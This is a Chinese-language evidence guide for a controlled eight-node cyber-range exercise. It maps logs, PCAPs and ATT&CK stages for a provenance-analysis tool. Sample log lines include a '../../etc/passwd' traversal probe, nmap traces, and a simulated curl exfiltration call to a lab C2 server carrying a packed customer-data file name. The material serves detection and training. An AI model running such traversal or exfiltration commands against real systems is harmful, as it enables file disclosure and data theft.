# TraceGuard 八节点靶场攻击链证据说明

## 1. 文件用途

本说明文件用于配合 `attack_20260909_161811_v2.tar.gz` 证据包使用，帮助 TraceGuard 系统组理解本次阿里云八节点靶场实验中产生的数据来源、攻击过程、文件目录结构和推荐解析重点。

本次实验属于受控靶场模拟，不包含真实恶意程序和真实漏洞利用代码。实验目标是按照课程要求，在已搭建的企业内网靶场中构造一次可复现的攻击链，并采集主机日志、主机行为和网络流量，供 TraceGuard 做溯源分析验证。

最终交付文件：

```text
attack_20260909_161811_v2.tar.gz
attack_20260909_161811_v2.sha256
```

压缩包 SHA256：

```text
63762b19f214813f8317d87e971127d68b2ef2df7818d3155de7d6a0f703ed22
```

---

## 2. 靶场节点信息

| 节点编号 | 节点名称 | IP 地址 | 角色说明 |
|---|---|---:|---|
| N1 | N1-Attacker | 10.0.1.169 | 攻击机，用于发起扫描探测和 Web 访问 |
| N2 | N2-C2 | 10.0.1.170 | C2 模拟服务器，使用 Python HTTP Server 记录 beacon / exfil_simulation 请求 |
| N3 | N3-Firewall | - | 防火墙与边界抓包节点，用 tcpdump 保存 PCAP |
| N4 | N4-Web | 10.0.2.208 | Web 服务器，部署 nginx，并开启 auditd 行为审计 |
| N5 | N5-Email | 10.0.2.209 | Email 服务器，参与端口探测流量 |
| N6 | N6-LogServer | 10.0.3.120 | 中央日志服务器，集中保存远程日志和最终证据包 |
| N7 | N7-Office | 10.0.3.118 | Windows 办公网段主机，导出 System / Application / Security 日志 |
| N8 | N8-Core | 10.0.3.119 | 核心服务器，开启 auditd，记录敏感文件访问和命令执行 |

---

## 3. 本次攻击链概述

本次实验构造的攻击链如下：

```text
N1-Attacker
  ↓
N4-Web
  ↓
N2-C2
  ↓
N7-Office
  ↓
N8-Core
```

需要注意：这里的“攻击链”是用于溯源验证的受控模拟链路，不代表真实入侵成功。实验重点是让每个阶段产生可被 TraceGuard 解析和关联的证据。

---

## 4. 攻击过程时间线

| 时间 | 阶段 | 操作说明 | 主要证据文件 |
|---|---|---|---|
| 15:55 - 15:56 | 扫描探测 / Web 入口访问 | N1 对 N4-Web、N5-Email 等节点进行端口探测；随后访问 N4-Web 的 `/`、`/login`、`/admin`、`/upload`、`/search?q=../../etc/passwd` 等路径 | `pcap/attack_chain_final.pcap`、`logs/n4_nginx_access.log` |
| 15:56:22 | C2 通信 | N4-Web 访问 N2-C2 的 `/beacon?host=N4-Web&stage=c2`，状态码 200 | `logs/c2_http_final.log`、`pcap/attack_chain_final.pcap`、`pcap/c2_office_core.pcap` |
| 15:56:41 | Office 主机 C2 行为 | N7-Office 访问 N2-C2 的 `/beacon?host=N7-Office&stage=c2`，状态码 200 | `logs/c2_http_final.log`、`pcap/c2_office_core.pcap`、`logs/n7_windows_logs.zip` |
| 15:57:02 | Core 外联模拟 | N8-Core 访问 N2-C2 的 `/exfil_simulation?host=N8-Core&file=customer_data.tar.gz`，状态码 200 | `logs/c2_http_final.log`、`pcap/c2_office_core.pcap`、`logs/n8_audit.log` |
| 16:02 - 16:11 | 重复验证 | N7-Office 和 N8-Core 多次访问 N2-C2，N4-Web 也再次访问 C2，用于补齐通信证据 | `logs/c2_http_final.log`、`pcap/c2_office_core.pcap` |
| 实验期间 | 主机行为 | N4-Web 执行文件创建、读取、删除和命令执行；N8-Core 访问 `/data/secret/customer_data.txt` 并打包模拟敏感数据 | `logs/n8_audit.log`、`logs/n6_recent_logs.tar.gz` |

---

## 5. 证据包目录结构

解压 `attack_20260909_161811_v2.tar.gz` 后，目录结构如下：

```text
attack_20260909_161811/
├── logs/
│   ├── c2_http_final.log
│   ├── n4_nginx_access.log
│   ├── n6_recent_logs.tar.gz
│   ├── n7_windows_logs.zip
│   └── n8_audit.log
├── notes/
│   ├── attack_steps.md
│   └── recent_log_files.txt
└── pcap/
    ├── attack_chain_final.pcap
    └── c2_office_core.pcap
```

文件大小参考：

| 文件 | 大小 | 说明 |
|---|---:|---|
| `logs/c2_http_final.log` | 1.1 KB | N2-C2 HTTP 服务日志 |
| `logs/n4_nginx_access.log` | 1.5 KB | N4-Web nginx 访问日志 |
| `logs/n6_recent_logs.tar.gz` | 1.6 MB | N6 中央日志服务器最近日志打包 |
| `logs/n7_windows_logs.zip` | 352 KB | N7 Windows 三类事件日志压缩包 |
| `logs/n8_audit.log` | 1.5 MB | N8-Core auditd 原始日志 |
| `pcap/attack_chain_final.pcap` | 49 KB | N3 抓取的 N1→N4、N4→C2 等主攻击链流量 |
| `pcap/c2_office_core.pcap` | 4.8 KB | N2-C2 补充抓取的 N4/N7/N8 到 C2 流量 |
| `notes/attack_steps.md` | 1.8 KB | 原始实验步骤记录 |
| `notes/recent_log_files.txt` | 1.6 KB | N6 打包日志文件列表 |

---

## 6. 每个证据文件说明

### 6.1 `logs/c2_http_final.log`

来源节点：N2-C2，IP 为 `10.0.1.170`。

作用：证明 C2 模拟服务器收到了来自 Web、Office、Core 三类节点的 HTTP 请求。

关键证据包括：

```text
10.0.2.208 - - [09/Sep/2026 15:56:22] "GET /beacon?host=N4-Web&stage=c2 HTTP/1.1" 200 -
10.0.3.118 - - [09/Sep/2026 15:56:41] "GET /beacon?host=N7-Office&stage=c2 HTTP/1.1" 200 -
10.0.3.119 - - [09/Sep/2026 15:57:02] "GET /exfil_simulation?host=N8-Core&file=customer_data.tar.gz HTTP/1.1" 200 -
```

推荐 TraceGuard 提取字段：

| 字段 | 示例 |
|---|---|
| source_ip | `10.0.2.208`、`10.0.3.118`、`10.0.3.119` |
| destination_ip | `10.0.1.170` |
| destination_port | `8080` |
| url | `/beacon?...`、`/exfil_simulation?...` |
| attack_stage | Command and Control / Exfiltration Simulation |

说明：日志中存在一条 `customer_data.tar.gzcurl`，这是人工粘贴命令时产生的异常 URL，后面已有正常的 `customer_data.tar.gz` 记录。TraceGuard 分析时建议优先使用正常 URL。

---

### 6.2 `logs/n4_nginx_access.log`

来源节点：N4-Web，IP 为 `10.0.2.208`。

作用：证明攻击机 N1 对 Web 服务器进行了访问、探测和异常路径请求。

关键证据包括：

```text
10.0.1.169 - - [09/Sep/2026:15:56:04 +0800] "GET / HTTP/1.1" 200 612 "-" "curl/7.81.0"
10.0.1.169 - - [09/Sep/2026:15:56:04 +0800] "GET /login HTTP/1.1" 404 162 "-" "curl/7.81.0"
10.0.1.169 - - [09/Sep/2026:15:56:04 +0800] "GET /admin HTTP/1.1" 404 162 "-" "curl/7.81.0"
10.0.1.169 - - [09/Sep/2026:15:56:04 +0800] "GET /upload HTTP/1.1" 404 162 "-" "curl/7.81.0"
10.0.1.169 - - [09/Sep/2026:15:56:04 +0800] "GET /search?q=../../etc/passwd HTTP/1.1" 404 162 "-" "curl/7.81.0"
```

还包含 nmap 探测痕迹：

```text
Nmap Scripting Engine
GET /nmaplowercheck...
POST /sdk
GET /HNAP1
```

推荐 TraceGuard 映射：

| 现象 | 推荐阶段 |
|---|---|
| nmap 用户代理或 nmap 特征路径 | Reconnaissance / Discovery |
| `/login`、`/admin`、`/upload` | Initial Access / Web Probing |
| `../../etc/passwd` | Web Exploit Attempt / Credential or File Discovery |

---

### 6.3 `logs/n6_recent_logs.tar.gz`

来源节点：N6-LogServer。

作用：保存 N6 中央日志服务器上最近采集到的日志，包括本机日志和部分远程集中日志。

其中可见远程日志目录包括：

```text
var/log/remote/web/
var/log/remote/core/
var/log/remote/firewall/
```

主要类型包括：

```text
auth.log
syslog
remote/web/auditd.log
remote/core/auditd.log
remote/firewall/sudo.log
```

推荐用途：作为集中日志来源，补充各节点系统日志、远程日志、审计日志、服务日志。

注意：Windows 原始事件日志已单独放在 `logs/n7_windows_logs.zip` 中。

---

### 6.4 `logs/n7_windows_logs.zip`

来源节点：N7-Office，IP 为 `10.0.3.118`。

压缩包内容：

```text
n7_application.evtx
n7_security.evtx
n7_system.evtx
```

作用：提供 Windows 办公网段主机的 System、Application、Security 三类事件日志。

实验中 N7 进行了以下受控行为：

```text
创建 C:\Evidence / C:\LabAttack 目录
创建 note.txt 文件
启动 PowerShell 子进程执行 whoami
访问 N2-C2 的 /beacon?host=N7-Office&stage=c2
创建并删除 lab_temp 本地账号
删除临时文件 note.txt
```

推荐 TraceGuard 重点解析：

| 日志 | 关注点 |
|---|---|
| Security | 登录事件、账号创建/删除、权限相关事件 |
| System | 服务、系统组件、网络/远程操作相关事件 |
| Application | PowerShell、应用程序运行异常或命令执行痕迹 |

---

### 6.5 `logs/n8_audit.log`

来源节点：N8-Core，IP 为 `10.0.3.119`。

作用：证明核心服务器上出现敏感文件访问、打包和外联相关行为。

关键证据关键词：

```text
core_secret_access
core_execve
/data/secret/customer_data.txt
/tmp/customer_data.tar.gz
curl
exfil_simulation
```

本次实验中 N8 执行了：

```text
创建 /data/secret/customer_data.txt
读取 /data/secret/customer_data.txt
打包生成 /tmp/customer_data.tar.gz
访问 http://10.0.1.170:8080/exfil_simulation?host=N8-Core&file=customer_data.tar.gz
```

推荐 TraceGuard 映射：

| 现象 | 推荐阶段 |
|---|---|
| `/data/secret/customer_data.txt` 被访问 | Collection |
| `tar czf /tmp/customer_data.tar.gz` | Collection / Archive Collected Data |
| `curl http://10.0.1.170:8080/exfil_simulation...` | Command and Control / Exfiltration Simulation |
| `execve` 系统调用 | Execution |

---

### 6.6 `pcap/attack_chain_final.pcap`

来源节点：N3-Firewall。

作用：保存边界防火墙视角下的主要攻击流量。

已确认包含：

```text
N1-Attacker 10.0.1.169 -> N4-Web 10.0.2.208:80
GET /
GET /login
GET /admin
GET /upload
GET /search?q=../../etc/passwd
HTTP/1.1 200 OK
HTTP/1.1 404 Not Found
```

同时包含部分扫描探测连接，如：

```text
10.0.1.169 -> 10.0.2.208:22
10.0.1.169 -> 10.0.2.208:80
10.0.1.169 -> 10.0.2.209:25
10.0.1.169 -> 10.0.2.209:3306
```

推荐 TraceGuard 用它还原：

```text
N1-Attacker -> N4-Web
N1-Attacker -> N5-Email
N4-Web -> N2-C2
```

---

### 6.7 `pcap/c2_office_core.pcap`

来源节点：N2-C2 本机补充抓包。

作用：补充 N3 未捕获到的 N7/N8 到 C2 的流量。

已确认包含：

```text
N4-Web 10.0.2.208 -> N2-C2 10.0.1.170:8080
N7-Office 10.0.3.118 -> N2-C2 10.0.1.170:8080
N8-Core 10.0.3.119 -> N2-C2 10.0.1.170:8080
```

关键 URL：

```text
/beacon?host=N4-Web&stage=c2
/beacon?host=N7-Office&stage=c2
/exfil_simulation?host=N8-Core&file=customer_data.tar.gz
```

推荐 TraceGuard 用它补齐 C2 通信和核心服务器异常外联链路。

---

## 7. 推荐 TraceGuard 输出的攻击路径

推荐根据证据还原如下路径：

```text
10.0.1.169 N1-Attacker
  -> 10.0.2.208 N4-Web
  -> 10.0.1.170 N2-C2
  -> 10.0.3.118 N7-Office
  -> 10.0.3.119 N8-Core
```

更严谨的图关系建议如下：

```text
N1-Attacker -> N4-Web       证据：attack_chain_final.pcap、n4_nginx_access.log
N1-Attacker -> N5-Email     证据：attack_chain_final.pcap 中的端口探测
N4-Web -> N2-C2             证据：c2_http_final.log、attack_chain_final.pcap、c2_office_core.pcap
N7-Office -> N2-C2          证据：c2_http_final.log、c2_office_core.pcap、n7_windows_logs.zip
N8-Core -> N2-C2            证据：c2_http_final.log、c2_office_core.pcap、n8_audit.log
N8-Core -> /data/secret     证据：n8_audit.log
```

注意：从严格证据角度看，`N2-C2 -> N7-Office` 和 `N2-C2 -> N8-Core` 不是主动入侵连接，而是 N7/N8 主动访问 C2 的模拟通信。因此图谱中建议标为：

```text
N7-Office -> N2-C2
N8-Core -> N2-C2
```

而不是反向写成 C2 主动控制主机。

---

## 8. 推荐 ATT&CK 阶段映射

| 实验现象 | 证据文件 | 推荐阶段 |
|---|---|---|
| N1 对 N4/N5 端口探测 | `attack_chain_final.pcap`、`n4_nginx_access.log` | Reconnaissance / Discovery |
| N1 访问 `/login`、`/admin`、`/upload` | `n4_nginx_access.log`、`attack_chain_final.pcap` | Initial Access / Web Probing |
| 出现 `../../etc/passwd` 路径 | `n4_nginx_access.log`、`attack_chain_final.pcap` | Exploit Attempt / File Discovery |
| N4 出现文件创建、读取、删除、命令执行 | `n6_recent_logs.tar.gz` 中的 web auditd，必要时结合 N4 原始日志 | Execution / Defense Evasion / Collection |
| N4/N7/N8 访问 `/beacon` | `c2_http_final.log`、`c2_office_core.pcap` | Command and Control |
| N7 产生 Windows 账号、进程、文件行为 | `n7_windows_logs.zip` | Execution / Persistence Simulation / Account Management |
| N8 访问 `/data/secret/customer_data.txt` | `n8_audit.log` | Collection |
| N8 打包 `customer_data.tar.gz` | `n8_audit.log` | Archive Collected Data |
| N8 访问 `/exfil_simulation` | `c2_http_final.log`、`c2_office_core.pcap`、`n8_audit.log` | Exfiltration Simulation |

---

## 9. 建议 TraceGuard 优先解析顺序

为了减少解析难度，建议按以下顺序处理：

1. 解析 `logs/c2_http_final.log`，先提取 C2 通信关系：
   - `10.0.2.208 -> 10.0.1.170`
   - `10.0.3.118 -> 10.0.1.170`
   - `10.0.3.119 -> 10.0.1.170`

2. 解析 `logs/n4_nginx_access.log`，提取 Web 入口访问：
   - `10.0.1.169 -> 10.0.2.208`
   - URL：`/`、`/login`、`/admin`、`/upload`、`/search?q=../../etc/passwd`

3. 解析 `pcap/attack_chain_final.pcap`，验证 N1 到 N4/N5 的网络连接和 HTTP 请求。

4. 解析 `pcap/c2_office_core.pcap`，补齐 N4/N7/N8 到 N2-C2 的网络通信证据。

5. 解析 `logs/n8_audit.log`，提取核心服务器敏感文件访问和命令执行：
   - `/data/secret/customer_data.txt`
   - `/tmp/customer_data.tar.gz`
   - `curl http://10.0.1.170:8080/exfil_simulation...`

6. 解析 `logs/n7_windows_logs.zip` 中的 `.evtx`，提取 N7 上的账号、进程、应用和系统事件。

7. 解析 `logs/n6_recent_logs.tar.gz`，作为集中日志补充来源，补齐 web/core/firewall 的系统日志和 auditd 日志。

---

## 10. 建议标准化事件字段

TraceGuard 可将日志和 PCAP 统一为如下事件字段：

```json
{
  "timestamp": "",
  "source_type": "",
  "host": "",
  "source_ip": "",
  "destination_ip": "",
  "source_port": null,
  "destination_port": null,
  "protocol": "",
  "url": "",
  "username": "",
  "process_name": "",
  "command_line": "",
  "file_path": "",
  "event_type": "",
  "action": "",
  "raw_message": "",
  "attack_stage": "",
  "evidence_file": ""
}
```

---

## 11. 本次实验可以支持的结论

基于当前证据包，可以支持以下结论：

1. N1-Attacker 对 N4-Web、N5-Email 等节点进行了端口探测。
2. N1-Attacker 成功访问 N4-Web，并产生 Web 访问日志。
3. N1-Attacker 对 N4-Web 的 `/login`、`/admin`、`/upload`、`/search?q=../../etc/passwd` 发起了异常路径访问。
4. N4-Web 与 N2-C2 建立了 HTTP 通信，访问 `/beacon`。
5. N7-Office 与 N2-C2 建立了 HTTP 通信，访问 `/beacon`。
6. N8-Core 与 N2-C2 建立了 HTTP 通信，访问 `/exfil_simulation`。
7. N8-Core 产生了核心敏感文件访问和打包行为。
8. N7-Office 提供了 Windows System / Application / Security 原始事件日志，可用于进一步提取主机行为。
9. N3 / N2 提供了 PCAP 网络流量，N6 提供集中日志，满足主机日志、主机行为、网络流量三类数据采集要求。

---

## 12. 注意事项

1. 本实验是受控模拟，不应将其解释为真实漏洞利用成功。
2. `c2_http_final.log` 中有一条 `customer_data.tar.gzcurl`，属于命令粘贴时的异常记录，分析时可忽略，使用正常的 `customer_data.tar.gz` 记录。
3. `N7/N8 -> C2` 的流量主要在 `pcap/c2_office_core.pcap` 和 `logs/c2_http_final.log` 中体现；N3 的主 PCAP 更适合证明 N1 到 N4 的边界访问和 Web 入口流量。
4. `.evtx` 文件需要使用 Windows Event Viewer、PowerShell、EvtxECmd 或 TraceGuard 的 EVTX 解析模块读取。
5. `n6_recent_logs.tar.gz` 是集中日志补充包，里面可能包含与本次攻击无关的系统运行日志，TraceGuard 应结合时间窗口和 IP 地址过滤。

---

## 13. 推荐给 TraceGuard 的分析时间窗口

建议优先分析以下时间范围：

```text
2026-09-09 15:55:00 +0800  至  2026-09-09 16:12:00 +0800
```

重点 IP：

```text
10.0.1.169  N1-Attacker
10.0.1.170  N2-C2
10.0.2.208  N4-Web
10.0.2.209  N5-Email
10.0.3.118  N7-Office
10.0.3.119  N8-Core
10.0.3.120  N6-LogServer
```

重点关键词：

```text
/beacon
/exfil_simulation
N4-Web
N7-Office
N8-Core
customer_data.tar.gz
/data/secret/customer_data.txt
../../etc/passwd
Nmap Scripting Engine
core_secret_access
core_execve
```

